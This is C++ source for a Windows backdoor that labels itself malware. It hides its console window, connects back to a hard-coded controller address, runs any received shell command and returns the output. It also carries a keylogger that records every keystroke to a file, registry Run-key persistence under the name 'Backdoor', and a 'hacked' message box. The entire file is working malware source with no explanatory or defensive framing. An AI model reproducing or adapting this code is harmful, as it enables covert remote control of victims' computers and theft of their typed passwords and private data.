#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <iostream>
#include <map>
#include <vector>
#include <sstream>
#include <string>
#include <fstream>
#include <memory>

const std::string       SERVER_IP = "192.168.233.135";
const std::string       _NUM_CHAR = {")!@#$%^&*("};
const std::string       _CHARS_VN = {";=,-./`"};
const std::string       _CHARS_VS = {":+<_>?~"};
const std::string       _CHARS_VA = {"[\\]\';"};
const std::string       _CHARS_VB = {"{|}\""};
const std::string       _KEY_LOGGER_FILE = {"keys.log"};
constexpr int           SERVER_PORT = 51243;

typedef std::string (*command_handler)(const std::vector<std::string>& args);

class Socket {
private:
    int                 _socket_id;
    struct sockaddr_in  _server_address;
public:
    Socket(const std::string& server, const int& port):
        _server_address {0} {

        this->_socket_id =socket(AF_INET, SOCK_STREAM, 0);

        this->_server_address.sin_family = AF_INET;
        this->_server_address.sin_port = htons(port);
        this->_server_address.sin_addr.S_un.S_addr =
            inet_addr(server.c_str());
    }

    int Connect() {
        return connect(this->_socket_id,
                        (struct sockaddr *)&this->_server_address,
                        sizeof(this->_server_address));
    }

    int Receive(char *buffer, int length) {
        return recv(this->_socket_id, buffer, length, 0);
    }

    int Send(const char *buffer, int length) {
        return send(this->_socket_id, buffer, length, 0);
    }
    ~Socket() {
        closesocket(this->_socket_id);
    }
};

class KeyLogger {
private:

public:
    static DWORD WINAPI Run(void *args) {
        std::cout << ">> Key-logger Start Running <<" << std::endl;

        bool is_capslock {false};
        bool is_numlock {false};
        bool is_left_shift {false};
        bool is_right_shift {false};
        bool last_key_state[0xFF] = {0};
        std::ofstream report_file;

        while (true) {
            Sleep(10);

            is_capslock = GetKeyState(0x14) & 0xFF;
            is_numlock = GetKeyState(0x90) & 0xFF;
            is_left_shift = GetKeyState(0xA0) & 0xFF00;
            is_right_shift = GetKeyState(0xA1) & 0xFF00;

            /* Checking state of all virtual keys. */
            for (int i = 0; i<0xFF; i++) {
                bool is_pressed = GetKeyState(i) & 0xFF00;
                char showKey = (char)i;

                if (is_pressed && last_key_state[i] == false) {
                    if ((i>=0x41) && (i<=0x5A)) {
                        /* Alphabets. */
                        if (!is_capslock) {
                            if (!is_left_shift && !is_right_shift){
                                showKey = (char)(i+0x20);
                            }
                        } else if (is_left_shift || is_right_shift) {
                            showKey = (char)(i+0x20);
                        }

                    } else if ((i>=0x30) && (i<=0x39)) {
                        /* Numbers. */
                        if (is_left_shift || is_right_shift) {
                            showKey = _NUM_CHAR.c_str()[i-0x30];
                        }
                    } else if ((i>=0x60) && (i<=0x69) && is_numlock) {
                        /* Right side num-pad. */
                        showKey = (char)(i-0x30);
                    } else if ((i>=0xBA) && (i<=0xC0)) {
                        /* Printable characters. */
                        if (is_left_shift || is_right_shift) {
                            showKey = _CHARS_VS.c_str()[i-0xBA];
                        } else {
                            showKey = _CHARS_VN.c_str()[i-0xBA];
                        }
                    } else if ((i>=0xDB) && (i<=0xDF)) {
                        if (is_left_shift || is_right_shift) {
                            showKey = _CHARS_VB.c_str()[i-0xDB];
                        } else {
                            showKey = _CHARS_VA.c_str()[i-0xDB];
                        }
                    } else if (i==0x0D) {
                        showKey = (char)0x0A;
                    } else if (i>=0x6A && i<=0x6F) {
                        showKey = (char)(i-0x40);
                    } else if (i!=0x20 && i!=0x09) {
                        showKey = (char)0x00;
                    }

                    /* Save captured key. */
                    if (showKey!=(char)0x00) {
                        report_file.open(_KEY_LOGGER_FILE.c_str(),
                                            std::ios_base::app);
                        if (report_file.is_open()) {
                            report_file << showKey;
                            report_file.close();
                        }
                    }
                }

                /* Save last state of key. */
                last_key_state[i] = is_pressed;
            }
        }
    }
};

class Shell {
private:
    std::map<std::string, command_handler>  _handler;
    std::shared_ptr<KeyLogger>              _logger;
public:
    explicit Shell(): _logger {std::make_shared<KeyLogger>()} {
        this->_handler["quit"] =
        [](const std::vector<std::string>& args) -> std::string {
            exit(EXIT_SUCCESS);
        };

        this->_handler["cd"] =
        [](const std::vector<std::string>& args) -> std::string {
            std::vector<std::string> path_e {args};
            std::string path {};
            path_e.erase(path_e.begin());

            for (auto arg : path_e) {
                path.append(arg);
            }

            chdir(path.c_str());

            char buffer[1024] = {0};
            getcwd(buffer, 1024);

            return std::string{buffer};
        };

        this->_handler["autoboot"] =
        [](const std::vector<std::string>& args) -> std::string {
            /* Setup to start our program automatically. */
            TCHAR sizePATH[MAX_PATH] = {0};
            DWORD path_len = GetModuleFileName(NULL, sizePATH, MAX_PATH);
            if (path_len == 0) {
                return "Failed to get current path.";
            }

            HKEY new_value;
            if (RegOpenKey(HKEY_CURRENT_USER,
                TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                &new_value) != ERROR_SUCCESS) {
                return "Failed to open key: HKEY_CURRENT_USER" \
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            }

            DWORD path_len_in_bytes = path_len * sizeof(*sizePATH);
            if (RegSetValueEx(new_value,
                TEXT("Backdoor"),
                0,
                REG_SZ,
                (LPBYTE)sizePATH,
                path_len_in_bytes) != ERROR_SUCCESS) {
                RegCloseKey(new_value);
                return "Failed to set new value.";
            }

            RegCloseKey(new_value);
            return "Configure auto boot successfully.";
        };

        this->_handler["key-logger-start"] =
        [](const std::vector<std::string>& args) -> std::string {
            static bool is_running = false;

            if (!is_running) {
                is_running = true;
                HANDLE thread = CreateThread(NULL,
                                                0,
                                                KeyLogger::Run,
                                                NULL,
                                                0,
                                                NULL);

                return "Key-logger started.";
            }

            return "Key logger is already started.";
        };

        this->_handler["message-to-user"] =
        [](const std::vector<std::string>& args) -> std::string {
            MessageBox(NULL,
                        TEXT("Your computer has been hacked!"),
                        TEXT("Windows Installer"),
                        MB_OK | MB_ICONERROR);
            return "OK";
        };
    }

    ~Shell() {}

    void Run() {
        while (true) {
            /* 1. Try to connect to the server. */
            Socket sock{SERVER_IP, SERVER_PORT};
            while (true) {
                int res = sock.Connect();
                if (res == 0) {
                        break;
                }

                /* Reconnect after 10s. */
                Sleep(10000);
            }

            /* 2. Waiting for new command from server. */
            char buffer[1024] = {};
            while (sock.Receive(buffer, sizeof(buffer)) >= 0) {

                /* Parse command. */
                std::vector<std::string> command;
                std::istringstream iss{buffer};
                std::string word {0};
                char command_output[20480] = {0};

                while (std::getline(iss, word, ' ')) {
                    command.push_back(word);
                }

                if (this->_handler.find(command[0]) != this->_handler.end()) {
                    /* Run our command. */
                   std::string res = _handler[command[0]](command);
                   strncpy(command_output, res.c_str(), res.size());
                } else {
                    /* Run window command. */
                    char psBuffer[1024] = {0};
                    FILE *pPipe = _popen(buffer, "r");
                    if (pPipe) {
                        /* Reade pipe until end of file, or an error occurs. */
                        while (fgets(psBuffer, sizeof(psBuffer), pPipe)) {
                            strcat(command_output, psBuffer);
                        }

                        fclose(pPipe);

                        if (strlen(command_output) == 0) {
                            strcpy(command_output, "Command not found.");
                        }
                    } else {
                        strcpy(command_output, "Command not found.");
                    }
                }

                /* Send command output to our server. */
                sock.Send(command_output, sizeof(command_output));
            }
        }
    }
};

class MalwareController {
private:
    Shell _shell;

    MalwareController(): _shell {} {}

    ~MalwareController() {
        WSACleanup();
    }

public:
    int Init() {
        HWND        stealth;
        WSADATA     wsaData;
        /* 1. Make our backdoor window not visible to the target. */
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0); /* Hiding the window with 0. */

        /* 2. Initialize Winsock. */
        int res = WSAStartup(MAKEWORD(2, 0), &wsaData);
        if (res != 0) {
            std::cout << "Failed to initiate use of Winsock DLL by a process."
                      << std::endl;
            return res;
        }

        return 0;
    }

    void Run() {
        this->_shell.Run();
    }

    static MalwareController* GetInstance() {
        static MalwareController controller{};
        return &controller;
    }

};

/**
 * @brief Windows program entry point function.
 * 
 * @param hInstance     - Instance Handle - OS uses this value to identify the
 *                        executable when it is loaded in memory.
 * @param hPrevInstance
 * @param pCmdLine      - Command line arguments.
 * @param nCmdShow      - Windows Flags.
 * @return int 
 */
int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        LPSTR pCmdLine,
                        int nCmdShow) {

    std::cout << ">> Start Malware Program <<" << std::endl;

    int res = MalwareController::GetInstance()->Init();
    if (res != 0) {
        return EXIT_FAILURE;
    }

    MalwareController::GetInstance()->Run();

    return EXIT_SUCCESS;
}